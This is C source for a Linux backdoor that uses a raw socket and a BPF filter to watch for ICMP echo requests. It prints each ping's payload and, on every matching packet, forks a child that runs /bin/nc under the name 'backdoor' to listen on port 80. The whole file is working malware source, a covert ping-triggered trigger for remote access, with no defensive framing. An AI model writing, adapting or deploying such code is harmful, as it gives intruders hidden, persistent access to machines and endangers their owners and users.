#include <unistd.h>
#include <stdio.h>
#include <strings.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <linux/filter.h>
#include <arpa/inet.h>
#include <linux/if_ether.h>
#include <netinet/ip_icmp.h>

#define MAX_PACKET_SIZE 65000
#define ARRAY_SIZE(arr) (sizeof(arr) / sizeof(arr[0]))
#define isascii(c) ((c & ~0x7F) == 0)

// Compiled w/ tcpdump 'icmp[icmptype] == 8' -dd
struct sock_filter code[] = {
   { 0x28, 0, 0, 0x0000000c },
   { 0x15, 0, 8, 0x00000800 },
   { 0x30, 0, 0, 0x00000017 },
   { 0x15, 0, 6, 0x00000001 },
   { 0x28, 0, 0, 0x00000014 },
   { 0x45, 4, 0, 0x00001fff },
   { 0xb1, 0, 0, 0x0000000e },
   { 0x50, 0, 0, 0x0000000e },
   { 0x15, 0, 1, 0x00000008 },
   { 0x6, 0, 0, 0x00040000 },
   { 0x6, 0, 0, 0x00000000 },
};

typedef struct packet {
   struct icmp hdr;
   char msg[MAX_PACKET_SIZE - sizeof(struct icmp)];
} packet;

int main(int argc, char ** argv) {


    int sock,ret,i,recv_len,child;
    packet pkt;

    struct sock_fprog bpf = {
        .len = ARRAY_SIZE(code),
        .filter = code,
    };

    sock = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));

    if (sock < 0)
        printf("[-] Could not initialize raw socket\n");

    ret = setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER, &bpf, sizeof(bpf));

    if(ret < 0)
        printf("[-] Could not attach bpf filter to socket\n");

    while(1) {
        bzero(pkt.msg, MAX_PACKET_SIZE-sizeof(struct icmp));
        if((recv_len = recv(sock, &pkt, sizeof(pkt), 0)) > 0) {

            // Process packet
            printf("[+] Got packet!   len:%d    msg:", recv_len);
            for (i = sizeof(struct icmp)+1; i < recv_len-1; i++) {
                printf("%c", pkt.msg[i]);
            }
            printf("\n");

            // Fork() -> exec() child process to handle connection
            if((child = fork()) == 0) {
                execl("/bin/nc","backdoor", "-lvp 80", (char * )NULL);
            }
            continue;
        }

    }
    close(sock);
}
